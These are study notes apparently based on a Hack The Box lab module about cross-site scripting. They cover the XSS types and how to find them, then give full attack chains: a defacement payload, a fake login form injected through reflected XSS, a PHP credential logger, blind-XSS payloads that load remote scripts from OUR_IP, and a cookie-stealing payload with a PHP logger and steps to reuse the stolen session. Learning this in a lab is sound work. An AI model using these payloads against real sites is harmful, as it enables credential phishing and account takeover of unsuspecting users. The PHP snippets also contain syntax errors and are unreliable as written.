# XSS 
## What is XSS
**XSS** vulnerabilities **take advantage** of a flaw in user input sanitization to "write" **JavaScript** code to the page and execute it on the **client side**, leading to several types of attacks.

A typical web app works by receiving the **HTML** code from the **back-end** server and rendering it on the **client-side** internet browser. When a vulnerable web application does not properly sanitize user input, a malicious user can inject extra **JavaScript** code in an input field (e.g., comment/reply), so once another user views the same page, they unknowingly execute the malicious **JavaScript** code.

**XSS** vulnerabilities are solely executed on the **client-side** and hence do not directly affect the **back-end** server. They can only affect the user executing the vulnerability.
## XSS Basics
**Types of XSS**
There are **three** main types of **XSS** vulnerabilities:

| Type                       | Description                                                                                                                                                                                     |
| -------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Stored (Persistent)        | The most critical type, which occurs when input is stored on the back-end database and then displayed upon retrieval (i.e. Comments or posts).                                                  |
| Reflected (Non-Persistent) | Occurs when user input is displayed on the page after being processed by the back-end server, but not being stored (i.e. search results or error messages).                                     |
| DOM-Based (Non-Persistent) | Occurs when user input is directly shown in the browser and is completely processed on the client-side without reaching the back-end (i.e. through client-side HTTP parameters or anchor tags). |

Possible things attackers can do with **XSS**:
* Session Hijacking
* Phishing
* Defacements
* Installation of Trojan Horses
* Browser Exploits
* Port Scanning
* DDoS Attacks
* Crypto Miners
**XSS** vulnerabilities can be anything that can be executed through browser **JavaScript** code. A basic example is having the **target** user unwittingly send their session cookie to the **attacker's** web server. 

As **XSS** attacks execute **JavaScript** code within the browser, they are limited to the browser's JS engine (i.e., **V8** in Chrome). They **cannot** execute system-wide **JavaScript** code to do something like system-level code execution. In modern browsers, they are also limited to the same domain of the vulnerable website. Nevertheless, being able to execute **JavaScript** in a user's browser may still lead to a wide variety of attacks, as mentioned above. In addition to this, if a skilled researcher identifies a binary vulnerability in a web browser (e.g., a [Heap overflow](http://hamsa.cs.northwestern.edu/readings/heap-overflows/) in Chrome), they can utilize an **XSS** vulnerability to execute a **JavaScript** exploit on the target's browser, which eventually breaks out of the browser's sandbox and executes code on the user's machine.

## XSS Types - Deepened
### Stored/Persistent XSS - Most Critical
If our injected XSS payload gets stored in the back-end database and retrieved upon visiting the page, this means that our XSS attack is persistent and may affect any user that visits the page.

This makes this type of XSS the most critical, as it affects a much wider audience since any user who visits the page would be a victim of this attack. Furthermore, Stored XSS may not be easily removable, and the payload may need removing from the back-end database.

#### Payload testing
As we can see, the web page below is a simple **To-Do List** app that we can add items to. We can try typing test and hitting enter/return to add a new item and see how the page handles it:
![[BJBNGq44ke.png]]
As we can see, our input was displayed on the page. If no sanitization or filtering was applied to our input, the page might be vulnerable to XSS.

We can test whether the page is vulnerable to XSS with the following basic **XSS payload**:
```html
<script>alert(window.origin)</script>
```
We use this payload as it is a very easy-to-spot method to know when our XSS payload has been successfully executed. 

Suppose the page allows any input and does not perform any sanitization on it. In that case, the alert should pop up with the URL of the page it is being executed on, directly after we input our payload or when we refresh the page:
![[S1-qMq4V1e.png]]
>[!tip] 
>Many modern web apps utilize **cross-domain IFrames** to handle user input, so even if the web form is vulnerable to XSS, it would not be a vulnerability on the main web app. This is why we are showing the value of `window.origin` in the alert box, instead of a static value like `1`. In this case, the alert box would reveal the URL it is being executed on, and will confirm which form is the vulnerable one, in case an IFrame was being used.

We did indeed get the alert, which means that the page is vulnerable to XSS. We can confirm this further by looking at the page source by clicking **[CTRL+U]**, and we should see our payload in the page source:
```html
<div></div><ul class ="list-unstyled" id="todo"><ul><script>alert(window.origin)</script></ul></ul>
```

As some modern browsers may block the **```alert()```** JavaScript function in specific locations, it may be handy to know a few other basic XSS payloads. One such payload is **```<plaintext>```**, which will stop rendering the HTML code that comes after it and display it as plaintext. 
Another easy-to-spot payload is **```<script>print()</script>```** that will pop up the browser print dialog, which is unlikely to be blocked by any browsers.

To see whether the payload is **persistent** and stored on the **back-end**, we can refresh the page and see whether we get the alert again. If we do, it's confirming that this is indeed a **Stored/Persistent** XSS vulnerability. This is not unique to us, as any user who visits the page will trigger the XSS payload and get the same alert.
### Reflected XSS
Reflected XSS gets processed by the back-end server. Unlike **Persistent** XSS, **Non-Persistent XSS** vulnerabilities are temporary and are not persistent through page refreshes. Hence, our attacks only affect the targeted user and will not affect other users who visit the page.

Reflected XSS vulnerabilities occur when our input reaches the back-end server and gets returned to us without being filtered or sanitized. There are many cases in which **our** entire **input** might get **returned** to us, like **error messages** or **confirmation messages**. In these cases, we may attempt using XSS payloads to see whether they execute.

The website below is a similar **To-Do List** app to the one we talked about in the previous section. We can try adding any **test** string to see how it's handled:
![[S1JY8qEE1g.png]]
As we can see, we get Task '**test**' could not be added, which includes **our input** test as **part of** the **error message**.

If our input was not filtered or sanitized, the page might be vulnerable to XSS. We can try the same XSS payload we used in the previous section and click Add:
![[H15nI9NNJx.png]]

Once we click Add, we get the alert pop-up:
![[SJOTUc4Nke-1.png]]

In this case, we see that the error message now says ``Task ''`` could not be added. Since our payload is wrapped with a ```<script>``` tag, it does not get rendered by the browser, so we get empty single quotes '' instead. We can once again view the page source to confirm that the error message includes our XSS payload:
```html
<div></div><ul class ="list-unstyled" id="todo"><div style="padding-left:25px">Task '<script>alert(window.origin)</script>' could not be added.</div></ul>
```
As we can see, the single quotes indeed contain our XSS payload ```<script>alert(window.origin)</script>```.

If we visit the **Reflected** page again, the error message **no longer appears**, and our XSS payload is **not executed**, which means that this XSS vulnerability is indeed **Non-Persistent**. Now you might have a question like, "_If the XSS vulnerability is Non-Persistent, how would we target victims with it?_"

This depends on which HTTP request is used to send our input to the server. We can check this through the Firefox Developer Tools by clicking ``CTRL+Shift+I`` and selecting the **Network** tab. Then, we can put our test payload again and click Add to send it:
![[BJgsPq4E1g.png]]
As we can see, the first row shows that our request was a **GET** request. **GET** request sends their parameters and data as part of the URL. 

So, to target a user, **we can send them a URL containing our payload**. We can right-click on the **GET** request in the **Network tab** and select **Copy>Copy URL**. Once the victim visits this URL, the XSS payload would execute:
![[Byd0wcNNJl.png]]
### DOM Based
While **reflected XSS** sends the input data to the **back-end** server through **HTTP requests**, **DOM XSS** is completely processed on the **client-side** through JavaScript. DOM XSS occurs when JavaScript is used to change the page source through the Document Object Model (DOM)

We can try adding a **test** item to the vulnerable website again:
![[B1amF9E4yl.png]]

However, if we open the **Network tab** in the Firefox **Developer** Tools, and re-add the **test** item, we would notice that **no HTTP requests** are being made:
![[Hy2LtcVEyx.png]]

We see that the **input parameter** in the **URL** is using a **hashtag #** for the item we added, which means that this is a **client-side parameter** that is **completely** processed on the **browser**. This indicates that the input is being processed at the client-side through JavaScript and never reaches the back-end; hence it is a **DOM-based XSS**.

Furthermore, if we **look at** the page **source** by hitting `CTRL+U`, we will notice that our **test** string is **nowhere to be found**. This is because the **JavaScript** code is **updating** the page when we click the **Add button**, which is **after** the page source is retrieved by our browser, hence the base page source will not show our input, and if we refresh the page, it will not be retained (i.e. Non-Persistent). We can still view the rendered page source with the Web Inspector tool by clicking `CTRL+SHIFT+C`: 
![[HkdAccEVkx.png]]

#### Source & Sink
To further understand the nature of the **DOM-based** XSS, we must understand the concept of the **Source** and **Sink** of the object displayed on the page. The **Source** is the **JavaScript object** that takes the **user input**, and it can be any input parameter like a URL parameter or an input field, as we saw above.

On the other hand, the **Sink** is the **function** that **writes** the **user input** to a **DOM Object** on the page. If the **Sink function** does not properly sanitize the user input, it would be vulnerable to XSS. Some of the commonly used JavaScript functions to write to DOM objects are:
* `document.write()`
* `DOM.innerHTML`
* `DOM.outerHTML`
Furthermore, some of the **jQuery** library **functions** that **write** to **DOM objects** are:
* `add()`
* `after()`
* `append()`

If a **Sink function** writes the exact **input** without any sanitization (**like the above functions**), then we know that the page should be vulnerable to XSS.

We can look at the **source code** of the **To-Do** web application, and check ``script.js``, and we will see that the **Source** is being taken from the ``task=`` parameter:
```js
var pos = document.URL.indexOf("task=");
var task = document.URL.substring(pos + 5, document.URL.length);
```

Right below these lines, we see that the page uses the ``innerHTML`` function to write the **task** variable in the **todo DOM**:
```js
document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);
```
So, we can see that we can control the input, and the output is not being sanitized, so this page should be vulnerable to **DOM XSS**.
#### DOM Attacks
If we try the **XSS payload** we have been using **previously**, we will see that it will **not execute**. This is because the **innerHTML** function does not allow the use of the ```<script>``` tags within it as a **security feature**. Still, there are many other **XSS payloads** we use that do not contain ```<script>``` tags, like the following XSS payload:
```js
<img src="" onerror=alert(window.origin)>
```

The above line **creates** a new **HTML image** object, which has a [[HTML - AIO - TODO#HTML Events#onerror | onerror]] attribute that can execute JavaScript code when the image is **not** found. So, as we provided an **empty image** link (``""``), our code should always **get executed** without having to use ```<script>``` tags:
![[ry-_ejENJg-1.png]]
To target a user with this **DOM XSS** vulnerability, we can once again **copy** the **URL** from the browser and share it, and once they visit it, the **JavaScript** code should execute. Both of these **payloads** are among the most basic **XSS** payloads.

There are many instances where we may need to use various payloads depending on the security of the web app and the browser, which we will discuss in the next section.
### XSS Discovery
By now, we should have a good understanding of what an XSS vulnerability is. We should also understand how XSS works through injecting JavaScript code into the client-side page source.

In this section, we will go through ways of detecting XSS vulnerabilities. In web application vulnerabilities, detecting them can become as difficult as exploiting them. However, as XSS vulnerabilities are widespread, many tools can help us in detecting and identifying them.

#### Automated Discovery
Almost all Web Application Vulnerability **Scanners** (like Nessus, Burp Pro, or ZAP) have various capabilities for **detecting** all three types of **XSS** vulnerabilities.
These **scanners** usually do two types of scanning: A **Passive Scan**, which reviews **client-side** code for potential **DOM-based** vulnerabilities, and an **Active Scan**, which sends various types of payloads to attempt to trigger an **XSS** through payload injection in the page source.

We can find **open-source** tools that can **assist** us in identifying **XSS**. Such tools usually work by **identifying** input fields in web pages, sending various types of **XSS** payloads, and then comparing the rendered page **source** to see if the same **payload** can be found in it. Still, this will not always be accurate, as sometimes, even if the same **payload** was **injected**, it might not lead to a successful execution due to various reasons, so we must always **manually verify** the **XSS** injection.

Some of the common **open-source** tools that can assist us in **XSS** discovery are **XSS Strike**, **Brute XSS**, and **XSSer**.

##### XSS Strike:
We can run the **script** and provide it a **URL** with a parameter using ```-u```. Let's try using it with our **Reflected XSS** example from the earlier section:
```bash
$ python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
```
The tool **identified** the **parameter** as **vulnerable** to **XSS** from the first payload. You do have to **verify** the payload manually. 
#### Manual Discovery
The **difficulty** of finding the **XSS** vulnerability **depends on** the level of **security** of the web application. **Basic XSS** vulnerabilities can usually be found through **testing** various XSS payloads, but identifying **advanced XSS** vulnerabilities requires **advanced** code **review** skills.

##### XSS Payloads
The most **basic method** of looking for **XSS** vulnerabilities is manually testing various **XSS** payloads against an input field. We can find huge lists of **XSS** payloads online, like the one on [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md) or the one in [PayloadBox](https://github.com/payloadbox/xss-payload-list). We can then begin testing these payloads one by one by copying each one and adding it in our form, and seeing whether an alert box pops up.
>[!Note]
>XSS can be injected into any input in the HTML page, which is not exclusive to HTML input fields, but may also be in ``HTTP headers`` like the ``Cookie`` or ``User-Agent`` (i.e. when their values are displayed on the page).

You will notice that the **majority** of the above **payloads** do **not** work with our example web apps. 
This is **because** these payloads are written for a **wide** variety of injection points (like injecting after a single quote) **or** are designed to **evade** certain **security measures** (like sanitization filters).
Furthermore, such **payloads** utilize a variety of injection vectors to execute **JavaScript** code, like basic ```<script>``` tags, other **HTML Attributes** like ```<img>```, or even **CSS Style attributes**. This is why we can expect that **many** of these payloads will **not** work in all test cases, as they are designed to work with certain types of injections.

This is why it is **not** very **efficient** to resort to **manually** copying/pasting **XSS payloads**, as it may take us a while to identify the vulnerability, especially if we have many input fields to test. 
This is why it **may** be more efficient to write our own **Python script** to **automate** sending these payloads and then **comparing** the page **source** to see how our payloads were **rendered**. This can help us in **advanced cases** where **XSS** tools cannot easily send and compare payloads. This way, we would have the advantage of customizing our tool to our target web application. However, this is an advanced approach to XSS discovery.

##### Code Review
The most **reliable** method of detecting **XSS** is manual code review, which should cover both back-end and front-end code. If we understand **precisely** how our **input** is being **handled** all the way until it reaches the web browser, we can write a **custom payload** that should work with high confidence.

Before we looked at a basic example of **HTML** code review during the **Source** and **Sink** for **DOM-based** XSS vulnerabilities. This gave us a **quick look** at how **front-end** code review works in identifying XSS vulnerabilities, although on a very basic front-end example.

We are **unlikely** to find any **XSS** vulnerabilities **through** payload lists or XSS tools for the more common web applications. This is because the developers of such web applications likely run their application through vulnerability assessment tools and then patch any identified vulnerabilities before release.
For such cases, **manual code review** may reveal **undetected** XSS vulnerabilities of common web applications. 

These are also advanced techniques, still, if you are interested in learning them, the **Secure Coding 101: JavaScript** and the **Whitebox Pentesting 101: Command Injection** modules from [HTB](https://hackthebox.com) thoroughly cover this topic.
## XSS Attacks 
### Defacing
One of the most common attacks usually used with **stored XSS** vulnerabilities is website **defacing** attacks. **Defacing** a website means **changing its look** for anyone who visits the website. Such attacks can carry great media echo and may significantly affect a company's investments and share prices, especially for banks and technology firms.
#### Defacement elements
We can utilize injected **JavaScript** code to make a web page look any way we like. However, **defacing** a website is usually used to send a simple message (i.e., "we successfully hacked you"), so giving the **defaced** web page a beautiful look isn't really the primary target.

Three **HTML** elements are usually utilized to change the main look of a web page:
* `Background Color: document.body.style.background`
* `Background: document.body.background`
* `Page Title: document.title`
* `Page Text: DOM.innerHTML`
We can utilize two or three of these elements to write a basic message to the web page and even remove the **vulnerable** element, such that it would be more **difficult** to quickly reset the web page.

**Changing Background**
To change a web page's **background**, we can choose a certain color or use an image. We will use a **color** as our **background** since most defacing attacks use a dark color for the **background**. To do so, we can use the following payload:
```<script>document.body.style.background = "#141d2b"</script>```
>[!Tip]
>Here we set the background color to the default HTB background color. We can use any other hex value, or a named color like `= "black`

Once we add our **payload** to the **To-Do** list, we will see that the background color **changed**:
![[H1H_UOH41l.png]]
This will be **persistent** through page refreshes and will appear for **anyone** who visits the page, as we are utilizing a **stored XSS** vulnerability.

Another option would be to set an **image** to the background using the following payload:
```<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>```
### Phishing
**Phishing** attacks usually utilize legitimate-looking information to trick the **victims** into sending their sensitive information to the attacker. A common form of **XSS** phishing attacks is through injecting **fake** login forms that send the **login details** to the **attacker's** server.

Furthermore, suppose we were to identify an **XSS** vulnerability in a web application for a particular **organization**. In that case, we can use such an **attack** as a phishing simulation exercise, which will also help us evaluate the **security awareness** of the organization's **employees**.

#### Discovery
When we visit a **test** website, we see that it is a simple online **image viewer**, where we can input a URL of an image, and it'll **display** it:
![[BkcAKOr4Je.png]]

This form of image viewers is **common** in online **forums** and similar web applications. As we have **control** over the URL, we can start by using the basic XSS payload we've been using. But when we try that payload, we see that nothing gets executed, and we get the dead image url icon:
![[SJG-qurNkl.png]]
#### Login Form Injection
Once we identify a working **XSS** payload, we can proceed to the phishing attack. We must inject an **HTML** code that displays a **login form** on the targeted page. This form should send the login information to a server we are listening on, such that once a user attempts to log in, we'd get their credentials.

We can easily find **HTML** code for a basic **login form**, or we can write our own:
```
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

In the above **HTML** code, **OUR_IP** is the IP of our **VM**, which we can find with the (**ip a**) command. We will later be listening on this IP to retrieve the credentials sent from the form. The login form should look as follows:

```
<div>
<h3>Please login to continue</h3>
<input type="text" placeholder="Username">
<input type="text" placeholder="Password">
<input type="submit" value="Login">
<br><br>
</div>
```

Next, we should prepare our **XSS** code and test it on the vulnerable form. To write HTML code to the **vulnerable** page, we can use the **JavaScript** function ```document.write()```. Discovery step. Once we **minify** our **HTML** code into a single line and add it inside the write function, the final **JavaScript** code should be as follows:
```document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');```

We can now inject this JavaScript code using our XSS payload. In this case, we are exploiting a Reflected XSS vulnerability, so we can copy the URL and our XSS payload in its parameters, as we've done in the Reflected XSS section, and the page should look as follows when we visit the malicious URL:
![[SJG-qurNkl 2.png]]
#### Cleaning Up
We can see that the **URL** field is still displayed, which defeats our line of "Please login to continue". So we should remove the **URL** field. To do so, we can use the **JavaScript** function ```document.getElementById().remove()``` function.

To find the **id** of the HTML element we want to remove, we can open the **Page Inspector Picker** by clicking `[CTRL+SHIFT+C]` and then clicking on the element we need: 
![[SkNOK9SVJg.png]]

As we see in both the source code and the hover text, the **url** has the id **urlform**

So, we can now use this **id** with the ```remove()``` function to remove the URL form:
```document.getElementById('urlform').remove();```

Now, once we add this code to our previous JavaScript code (after the ``document.write`` function), we can use this new JavaScript code in our payload.

When we try to inject our updated **JavaScript** code, we see that the **URL form** is indeed no longer displayed:
![[rJBs5cr4Jg.png]]

See, how there's still a piece of the original **HTML** code left after our **injected** login form. This can be removed by simply commenting it out, by adding an **HTML opening comment** after our **XSS** payload:
```...PAYLOAD... <!-- ```

We can now copy the final URL that should include the entire payload, and we can send it to our victims and attempt to trick them into using the fake login form.

#### Credential Stealing:
The part where we steal the login credentials when the victim attempts to log in on our injected login form. If you tried to log into the injected login form, you would probably get the error This site can’t be reached. This is because, as mentioned earlier, our HTML form is designed to send the login request to our IP, which should be listening for a connection. If we are not listening for a connection, we will get a site can’t be reached error.

So, let us start a simple **netcat** server and see what kind of request we get when someone attempts to log in through the form. To do so, we can start listening on port 80 in our Pwnbox, as follows:
```
sudo nc -lvnp 80
```

Now, let's attempt to login with the credentials **test:test**, and check the **netcat** output we get (don't forget to replace OUR_IP in the XSS payload with your actual IP):
```bash
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.XX.XX] XXXXX 
Get /?username=test&password=test&submit=Login HTTP/1.1
Host: 10.10.XX.XX
..SNIP..
```
As we can see, we can capture the credentials in the **HTTP** request URL (``/?username=test&password=test``). If any victim attempts to log in with the form, we will get their credentials.

However, as we are only listening with a **netcat** listener, it will not handle the **HTTP** request correctly, and the **victim** would get an "Unable to connect" error, which may raise some suspicions.
So, we can use a basic **PHP** script that logs the **credentials** from the **HTTP** request and then returns the victim to the **original** page **without** any injections. In this case, the victim may think that they successfully logged in and will use the Image Viewer as intended.

The following PHP script should do what we need, and we will write it to a file on our VM that we'll call ``index.php`` and place it in ``/tmp/tmpserver``:
```php
<?php
if (isset($_GET['username']) && isset($GET['password'])) {
	$file = fopen("creds.txt", "a+");
	fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n);
	header("Location: http://SERVER_IP/phishing/index.php");
	fclose($file);
	exit();
}
?>
```

Now that we have our ``index.php`` file ready, we can start a `PHP` listening server, which we can use **instead** of the basic **netcat** listener we used earlier:
```bash
$ mkdir /tmp/tmpserver
$ cd /tmp/tmpserver
$ vi index.php #At this step we wrote our index.php file
$ sudo php -S 0.0.0.0:80

PHP Development Server (http://0.0.0.0:80) started
```

If we try logging into the **injected** login form, we see that we get redirected to the original **Image Viewer** page. And if we check the **creds.txt** file in our **Pwnbox**, we see that we did get the login credentials:
```bash
$ cat creds.txt

Username: test | Password: test
```

With everything ready, we can start our PHP server and send the URL that includes our XSS payload to our victim, and once they log into the form, we will get their credentials and use them to access their accounts.
### Session Hijacking (cookies)
Modern web applications utilize cookies to maintain a user's session, which enables the user to only log in once and keep their logged-in session alive even if they visit the same website at another time or date. However, if a malicious user obtains the cookie data from the victim's browser, they may be able to gain logged-in access with the victim's user without knowing their credentials.

With the ability to execute **JavaScript** code on the **victim's** browser, we may be able to collect their **cookies** and send them to our server to **hijack** their logged-in session by performing a **Session Hijacking** (aka **Cookie Stealing**) attack.

#### Blind XSS Detection
We usually start **XSS** attacks by trying to **discover**. However, this time, we will be dealing with a Blind XSS vulnerability. A Blind XSS vulnerability occurs when the vulnerability is triggered on a page we don't have access to.

**Blind XSS** vulnerabilities usually occur with forms only accessible by certain users (e.g., Admins). Some potential examples include:

    * Contact Forms
    * Reviews
    * User Details
    * Support Tickets
    * HTTP User-Agent header

Let's run the test on the web application (/hijacking). We see a User Registration page with multiple fields, so let's try to submit a test user to see how the form handles the data:
![[H1IHRpHVJx.png]]

As we can see, once we submit the form we get the following message: 
![[SJbU0pSVye.png]]
This indicates that we will **not** see how our input will be handled since it will appear for the Admin only in a certain **Admin** Panel that we do not have access to. As we do not have access over the Admin panel in this case, how would we be able to detect an **XSS** vulnerability if we cannot see how the output is handled?

To do so, we can use the **same** trick we used in the previously, which is to use a **JavaScript** payload that sends an HTTP request back to our server. If the **JavaScript** code gets executed, we will get a response on our machine, and we will know that the page is indeed **vulnerable**.

However, this introduces two issues:
1. How can we know **which** specific field is vulnerable? Since any of the fields may execute our code, we can't know which of them did.
2.  How can we know **what** XSS payload to use? Since the page may be vulnerable, but the payload may not work?
#### Loading a Remote Script
In **HTML**, we can write **JavaScript** code within the ```<script>``` tags, but we can also include a remote script by providing its **URL**, as follows: 
```<script src="http://OUR_IP/script.js"></script>```

So, we can use this to execute a **remote JavaScript** file that is served on our VM. We can change the requested script name from script.js to the name of the field we are injecting in, such that when we get the request in our VM, we can **identify** the vulnerable input field that executed the script, as follows:
```<script src="http://OUR_IP/username"></script>```

If we get a request for **/username**, then we know that the username field is vulnerable to XSS, and so on. With that, we can start testing various XSS payloads that load a remote script and see which of them sends us a request:
```html
<script src=http://OUR_IP></script>

'><script src=http://OUR_IP></script>

"><script src=http://OUR_IP></script>

javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendCh
ild(a)')

<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP")</script>

<script>$.getScript("http://OUR_IP")</script>
```
**Before** we start sending payloads, we need to start a **listener** on our VM.

Now we can start **testing** these payloads **one by one** by using one of them for all of input fields and appending the name of the field after our IP, as mentioned earlier, like:
```html
<script src=http://OUR_IP/fullname></script> this goes inside the full-name field
<script src=http://OUR_IP/username></script> this goes inside the username field
```
>[!Tip]
>We will notice that emails must match an email format, even if we try manipulating the HTTP request parameters, as it seems to be validated on both the front-end and the back-end. Hence, the email field is not vulnerable, and we can skip testing it. Likewise, we may skip the password field, as passwords are usually hashed out and not usually shown in cleartext.

Once we submit the form, we **wait** a few seconds and check our terminal to see if anything called our server. If nothing calls our server, then we can proceed to the next payload. Once we receive a call to our server, we should note the last XSS payload we used as a working payload and note the input field name that called our server as the vulnerable input field.
#### Session Hijacking
Once we find a **working** XSS payload and have identified the vulnerable input field, we can proceed to **XSS** exploitation and perform a **Session Hijacking attack**.

A **session hijacking** attack is very **similar** to the **phishing** attack we performed in the previous section. It requires a **JavaScript** payload to send us the required data and a **PHP** script hosted on our server to grab and parse the transmitted data.

There are multiple JavaScript payloads we can use to grab the session cookie and send it to us, as shown by PayloadsAllTheThings:
```js
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```
Using **any** of the **two** payloads should work in sending us a **cookie**, but we'll use the second one, as it simply adds an image to the page, which may not be very malicious looking, while the first **navigates** to our cookie grabber **PHP** page, which may look suspicious.

We can write any of these JavaScript payloads to script.js, which will be hosted on our VM as well:
```js
new Image().src='http://OUR_IP/index.php?c='+document.cookie
```

Now, we can change the URL in the XSS payload we found earlier to use:
```html
<script src=http://OUR_IP/script.js></script>
```

With our **PHP** server running, we can now use the code as part of our **XSS** payload, send it in the vulnerable input field, and we should get a call to our server with the cookie value. **However**, if there were many cookies, we may **not** know which cookie value belongs to which cookie header. So, we can write a **PHP** script to split them with a new line and write them to a file. In this case, even if multiple victims trigger the **XSS** exploit, we'll get all of their cookies ordered in a file.

We can save the following ``PHP`` script as ``index.php``, and re-run the ``PHP`` server again:
```php
<?php
if (isset($_GET['c'])) 
{
	$list = explode(";", $_GET['c']);
	foreach ($list as $key => $value)
	{
		$cookie = urldecode($value)
		$file = fopen("cookies.txt", "a+");
		fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
	}
}
?>
```

Now, we **wait** for the victim to **visit** the vulnerable page and **view** our XSS payload. Once they do, we will get two requests on our server, one for script.js, which in turn will make another request with the cookie value:
```bash
10.10.10.10:52798 [200]: /script.js
10.10.10.10:52799 [200]: /index.php?c=cookie=f904f93c949d19d870911bf8b05fe7b2
```
As mentioned earlier, we get the cookie value right in the terminal, as we can see. However, since we prepared a PHP script, we also get the ``cookies.txt`` file with a clean log of cookies:
```bash
$ cat cookies.txt

Victim IP: 10.10.10.10 | Cookie: cookie=f904f93c949d19d870911bf8b05fe7b2
```

Finally, we can use this cookie on the ``login.php`` page to access the victim's account. To do so, once we navigate to ``/hijacking/login.php``, we can click **Shift+F9** in Firefox to reveal the Storage bar in the **Developer Tools**. Then, we can click on the `+` button on the top right corner and add our cookie, where the Name is the part before = and the Value is the part after = from our stolen cookie:
![[ryoW8lINJe.png]]